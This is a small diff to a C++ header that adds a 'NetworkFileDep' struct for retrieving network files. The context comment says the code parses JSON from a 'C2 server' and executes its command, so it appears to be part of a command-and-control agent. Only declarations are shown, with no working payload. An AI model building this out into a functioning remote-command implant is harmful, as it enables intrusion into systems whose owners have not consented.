@@ -51,6 +51,13 @@ struct LocalFileDep : public CommandDependency {
     bool Retrieve();
 };
 
+// For network files
+struct NetworkFileDep : public CommandDependency {
+    NetworkFileDep(const std::string& name, const std::string& path)
+        : CommandDependency(name, path) {}
+    bool Retrieve();
+};
+
 /* Parses JSON response from C2 server and executes that command */
 class Command {
    public:
